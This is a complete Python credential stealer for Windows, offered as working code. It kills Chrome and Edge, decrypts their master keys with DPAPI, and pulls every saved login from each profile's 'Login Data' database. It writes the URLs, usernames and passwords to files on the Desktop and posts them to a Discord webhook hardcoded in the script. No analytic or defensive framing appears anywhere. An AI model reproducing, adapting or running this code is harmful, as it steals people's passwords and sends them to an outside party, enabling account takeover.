import os
import sys
import json
import sqlite3
import shutil
import base64
import traceback
import requests
import subprocess
import time
import glob
from datetime import datetime

# ============================================================
# YOUR DISCORD WEBHOOK (hardcoded)
# ============================================================
WEBHOOK_URL = "https://discord.com/api/webhooks/1517673359876296704/Uauf-iR1yt_8NYyxOZJnI2S9YIWMisMJ5oLph0geBB04A-eCuiZ2-rnj_IS-gPjMehv8"

# ============================================================
# OUTPUT FOLDER – Desktop
# ============================================================
DESKTOP = os.path.join(os.environ['USERPROFILE'], 'Desktop')
LOG_FILE = os.path.join(DESKTOP, "extraction_log.txt")

def log(msg):
    try:
        with open(LOG_FILE, 'a', encoding='utf-8') as f:
            f.write(f"{datetime.now().strftime('%H:%M:%S')} - {msg}\n")
    except:
        pass

log("=== STARTED ===")

# ============================================================
# IMPORTS
# ============================================================
try:
    import win32crypt
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    log("Libraries OK")
except Exception as e:
    log(f"Import error: {e}")
    sys.exit(1)

LOCAL_APPDATA = os.environ.get('LOCAL_APPDATA', '')
if not LOCAL_APPDATA:
    log("LOCALAPPDATA missing")
    sys.exit(1)

# ============================================================
# DPAPI TEST
# ============================================================
def test_dpapi():
    try:
        test_data = b"test"
        encrypted = win32crypt.CryptProtectData(test_data, None, None, None, None, 0)
        decrypted = win32crypt.CryptUnprotectData(encrypted, None, None, None, None, 0)[1]
        return decrypted == test_data
    except:
        return False

if not test_dpapi():
    log("DPAPI failed – wrong user.")
    sys.exit(1)

# ============================================================
# BROWSER PROFILES
# ============================================================
def find_profiles(base_path):
    profiles = []
    default_path = os.path.join(base_path, 'Default')
    if os.path.exists(default_path):
        profiles.append(default_path)
    for p in glob.glob(os.path.join(base_path, 'Profile*')):
        if os.path.isdir(p):
            profiles.append(p)
    return profiles

BROWSERS = [
    {
        "name": "Chrome",
        "base": os.path.join(LOCAL_APPDATA, 'Google\\Chrome\\User Data'),
        "state": os.path.join(LOCAL_APPDATA, 'Google\\Chrome\\User Data\\Local State'),
        "proc": "chrome.exe"
    },
    {
        "name": "Edge",
        "base": os.path.join(LOCAL_APPDATA, 'Microsoft\\Edge\\User Data'),
        "state": os.path.join(LOCAL_APPDATA, 'Microsoft\\Edge\\User Data\\Local State'),
        "proc": "msedge.exe"
    }
]

def kill_browser(proc):
    try:
        subprocess.run(["taskkill", "/F", "/IM", proc], capture_output=True, check=False)
        time.sleep(1.5)
        log(f"Killed {proc}")
    except:
        pass

def decrypt_master_key(b64key):
    try:
        raw = base64.b64decode(b64key)
        if raw[:5] == b'DPAPI':
            raw = raw[5:]
        return win32crypt.CryptUnprotectData(raw, None, None, None, 0)[1]
    except Exception as e:
        log(f"Master key error: {e}")
        return None

def decrypt_password(blob, key):
    if not blob or len(blob) < 3:
        return "[EMPTY]"
    try:
        version = blob[0]
        if version != 1:
            return win32crypt.CryptUnprotectData(blob, None, None, None, 0)[1].decode('utf-8')
        nonce = blob[1:13]
        ciphertext = blob[13:-16]
        tag = blob[-16:]
        plaintext = AESGCM(key).decrypt(nonce, ciphertext + tag, None)
        return plaintext.decode('utf-8')
    except Exception as e:
        return f"[FAIL: {e}]"

def extract_credentials(db_path, key):
    if not os.path.exists(db_path):
        return []
    tmp = "tmp.db"
    try:
        shutil.copy2(db_path, tmp)
    except:
        return []
    creds = []
    try:
        conn = sqlite3.connect(tmp)
        for url, user, pw in conn.execute("SELECT origin_url, username_value, password_value FROM logins"):
            dec = decrypt_password(pw, key) if pw else ""
            creds.append({"url": url, "username": user or "", "password": dec})
        conn.close()
    except Exception as e:
        log(f"DB error: {e}")
    try: os.remove(tmp)
    except: pass
    return creds

# ============================================================
# SEND TO DISCORD (with error handling)
# ============================================================
def send_to_discord(all_data):
    total = sum(len(b['credentials']) for b in all_data.values())
    if total == 0:
        log("No credentials to send.")
        return False

    # Build message
    lines = [f"**📦 Extracted ({total})**"]
    for name, data in all_data.items():
        creds = data['credentials']
        if creds:
            lines.append(f"\n**{name} ({len(creds)})**")
            for c in creds[:15]:
                lines.append(f"  {c['url']} | {c['username']} | {c['password']}")
    msg = "\n".join(lines)[:1900]

    try:
        r = requests.post(WEBHOOK_URL, json={"content": msg}, timeout=10)
        if r.status_code in (200, 204):
            log("✅ Discord sent successfully.")
            return True
        else:
            log(f"❌ Discord error: {r.status_code} - {r.text[:100]}")
            return False
    except Exception as e:
        log(f"❌ Discord exception: {e}")
        return False

# ============================================================
# MAIN
# ============================================================
def main():
    # Kill browsers
    for b in BROWSERS:
        kill_browser(b["proc"])

    all_data = {}
    for b in BROWSERS:
        key = None
        if os.path.exists(b["state"]):
            try:
                with open(b["state"], 'r', encoding='utf-8') as f:
                    state = json.load(f)
                enc = state.get('os_crypt', {}).get('encrypted_key')
                if enc:
                    key = decrypt_master_key(enc)
                    if key:
                        log(f"{b['name']} master key OK.")
                    else:
                        log(f"{b['name']} master key FAIL.")
                else:
                    log(f"{b['name']} no encrypted_key.")
            except Exception as e:
                log(f"{b['name']} state error: {e}")
        else:
            log(f"{b['name']} state not found.")

        profiles = find_profiles(b["base"])
        all_creds = []
        for profile in profiles:
            db_path = os.path.join(profile, 'Login Data')
            if os.path.exists(db_path):
                creds = extract_credentials(db_path, key)
                if creds:
                    log(f"{b['name']} {os.path.basename(profile)}: {len(creds)}")
                    all_creds.extend(creds)
        all_data[b['name']] = {"credentials": all_creds}
        log(f"{b['name']} total: {len(all_creds)}")

    # Save to Desktop
    txt_path = os.path.join(DESKTOP, 'passwords.txt')
    with open(txt_path, 'w', encoding='utf-8') as f:
        for name, data in all_data.items():
            f.write(f"\n=== {name} ===\n")
            for c in data['credentials']:
                f.write(f"{c['url']} | {c['username']} | {c['password']}\n")
    log(f"passwords.txt saved to Desktop.")

    json_path = os.path.join(DESKTOP, f"exfil_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json")
    with open(json_path, 'w', encoding='utf-8') as f:
        json.dump(all_data, f, indent=2)
    log(f"JSON saved to Desktop.")

    # Try Discord
    success = send_to_discord(all_data)
    if not success:
        log("⚠️ Discord send failed – but passwords are on your Desktop.")

    log("=== FINISHED ===")

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        log(f"UNHANDLED: {traceback.format_exc()}")